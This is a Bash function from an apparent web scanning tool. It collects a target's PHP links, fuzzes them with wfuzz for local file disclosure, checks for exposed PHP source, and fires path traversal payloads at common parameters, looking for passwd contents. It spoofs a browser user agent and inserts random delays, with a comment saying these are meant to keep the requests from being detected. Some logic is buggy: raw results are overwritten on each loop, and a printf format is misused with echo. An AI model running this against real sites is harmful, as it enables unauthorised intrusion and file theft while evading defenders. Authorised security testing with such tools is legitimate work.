# ============================================
# __FUNC_CHECK_FUZZ - Fuzz testing for PHP URLs, code exposure, and path traversal vulnerabilities
# ============================================
# - Collects all .php URLs from the target and performs fuzz testing using wfuzz
# - Attempts code exposure by checking for common PHP code patterns
# - Tests for path traversal vulnerabilities with various payloads
# - Outputs results to various files and provides status on vulnerabilities found
# ============================================

__FUNC_CHECK_FUZZ() {

    # Files
    FUZZ_RAW_FILE="${TXT_DIR}/${DOMAIN}-fuzz.raw.txt"
    FUZZ_RESULT_FILE="${TXT_DIR}/${DOMAIN}-fuzz.txt"
    FUZZ_EXPOSED_FILE="${TXT_DIR}/${DOMAIN}-code-expose.txt"
    FUZZ_HITS_FILE="${TXT_DIR}/${DOMAIN}-lfd-hits.txt"

    # Collection of .php URLs
    GET_PHP=$(${CURL} -sLk \
        -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -H "Connection: keep-alive" \
        "${TARGET_URL}" \
        | grep -oiE 'href=["'\'' ]*[^"'\'']+(\.php([?#][^"'\'']*)?|[?][^"'\'']*)' \
        | sed -E 's/^href=["'\'' ]*//' \
        | sed -E 's/["'\'' ]*$//' \
        | sed -E 's|^https?://[^/]+||' \
        | sed -E 's|^/||' \
        | sort -u)

    COUNT_URLPHP=$(echo "${GET_PHP}" | wc -l)

    print_info "${FUZZ_START_LFD}: ${TARGET_URL} (${COUNT_URLPHP} ${FUZZ_FILES} .php)"
    print_warning "${FUZZ_URLS}:"

    while IFS= read -r URL; do
        echo " - ${TARGET_URL}/${URL}"
    done <<< "${GET_PHP}"
    
    print_warning "${FUZZ_LONG_PROCESS}"

    # Step 1: Fuzz with stealth
    for GETURL in ${GET_PHP}; do
        print_info "${FUZZ_TESTING}: ${TARGET_URL}/${GETURL}"

        wfuzz -z file,"${WORDLIST_LFD}" \
            -u "${TARGET_URL}/${GETURL}?file=FUZZ" \
            --sc 200 -t 1 \
            | cleancolor > "${FUZZ_RAW_FILE}"

        sleep $((RANDOM % 3 + 2))  # random delay between 2 and 4s
    done

    # Filters only positive responses
    FUZZ_RESULTS=$(grep -E '^[0-9]{9}: *[23-5][0-9]{2}' "${FUZZ_RAW_FILE}")

    {
        line
        echo "${FUZZ_RESULT} ${TARGET_URL}"
        line

        if [[ -f "${FUZZ_RAW_FILE}" ]]; then
            echo "${FUZZ_RESULTS}"
        else
            echo "${FUZZ_NO_RESULT} ${TARGET_URL}"
        fi

        separator
        echo "${DATE}"
        line
    } | tee "${FUZZ_RESULT_FILE}"

    separator
    print_bg "###### ${FINISHED}: ${FUZZ_TITLE}"
    separator

    # Step 2: Direct code exposure attempts
    CODE_RESULTS=""

    for GETDIS in ${GET_PHP}; do
        FULL_URL="${TARGET_URL}/${GETDIS}"
        RESPONSE=$(${CURL} -sLk \
            -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
            -H "Accept-Language: en-US,en;q=0.9" \
            -H "Connection: keep-alive" \
            --connect-timeout 5 --max-time 10  "${FULL_URL}")

        if echo "${RESPONSE}" | grep -Ei "root:|PD9waHA|<\?php" > /dev/null; then
            CODE_RESULTS+="${FULL_URL}\n"
        fi

        sleep $((RANDOM % 3 + 2))
    done

    {
        line
        echo "${FUZZ_CODE_EXPOSE} ${TARGET_URL}"
        line

        if [[ -n "${CODE_RESULTS}" ]]; then
            echo "${CODE_RESULTS}"
        else
            echo "${FUZZ_NOCODE_EXPOSE} ${TARGET_URL}"
        fi

        separator
        echo "${DATE}"
        line
    } | tee "${FUZZ_EXPOSED_FILE}"

    separator
    print_bg "###### ${FINISHED}: ${FUZZ_CODE_EXPOSE_TITLE}"
    separator

    # Step 3: LFD Tests (Path Traversal)
    print_info "${FUZZ_START_PATH_TRAVERSAL}: ${TARGET_URL} ${FUZZ_FILTER}"
    PHP_ARRAY=("file" "path" "page" "dir" "document")
    mapfile -t PAYLOADS < "${WORDLIST_TRANSVERSAL}"

    LFD_RESULTS=""

    for GETLFD in ${GET_PHP}; do
        for PARAM in "${PHP_ARRAY[@]}"; do
            for PAYLOAD in "${PAYLOADS[@]}"; do
                FULL_URL="${TARGET_URL}/${FRAME_NAME}/${GETLFD}?${PARAM}=${PAYLOAD}"
                RESPONSE=$(${CURL} -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
                -H "Accept-Language: en-US,en;q=0.9" \
                -H "Connection: keep-alive" "${FULL_URL}")

                if echo "${RESPONSE}" | grep -Ei "root:|PD9waHA|<\?php" > /dev/null; then
                    LFD_RESULTS+="${FUZZ_PATH_TRAVERSAL_DETECTED}: ${FULL_URL}\n"
                fi

                # Avoid multiple requisitions to be detected
                sleep $((RANDOM % 3 + 2))
            done
        done
    done

    {
        line
        print_info "${FUZZ_PATH_TRAVERSAL_RESULT} ${TARGET_URL}"
        line
    if [[ -n "${LFD_RESULTS}" ]]; then
        echo "%b" "${LFD_RESULTS}"
    else
        echo "${FUZZ_NO_PATH_TRAVERSAL} ${TARGET_URL}"
    fi
    } | tee "${FUZZ_HITS_FILE}"

    createFile "fuzz" "${FUZZ_TITLE} - ${TARGET_URL}"
    print_success "${SAVED_RESULT} ${FUZZ_RESULT_FILE}"

    createFile "code-expose" "${FUZZ_CODE_EXPOSE_TITLE} - ${TARGET_URL}"
    print_success "${SAVED_RESULT} ${FUZZ_EXPOSED_FILE}"

    createFile "lfd-hits" "${FUZZ_PATH_TRAVERSAL_TITLE} - ${TARGET_URL}"
    print_success "${SAVED_RESULT} ${FUZZ_HITS_FILE}"

    # Clean
    [[ -f "${FUZZ_RAW_FILE}" ]] && rm "${FUZZ_RAW_FILE}"
}
